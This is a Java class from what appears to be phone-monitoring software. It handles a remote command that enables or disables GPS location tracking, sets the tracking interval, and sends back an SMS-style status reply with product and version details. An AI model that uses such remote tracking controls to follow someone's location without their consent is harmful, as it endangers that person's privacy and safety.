package com.vvt.rmtcmd.pcc;

import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.PhoneixCompliantCommand;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCGPSCommand extends PCCRmtCmdAsync {
	
	private int mode = 0;
	private int timerIndex = 0;
	
	public PCCGPSCommand(int mode, int timerIndex) {
		this.mode = mode;
		this.timerIndex = timerIndex;
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(PhoneixCompliantCommand.GPS);
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		doSMSHeader();
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		try {
			Preference pref = Global.getPreference();
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			if (mode == DISABLE) {
				gps.setEnabled(false);
			} else {
				gps.setEnabled(true);
			}
			if (timerIndex != 0) {
				GPSOption opt = gps.getGpsOption();
				int index = timerIndex - 1;
				opt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index]);
				gps.setGpsOption(opt);
			}
			pref.commit(gps);
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		systemEvent.setSystemMessage(responseMessage.toString());
		db.insert(systemEvent);
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
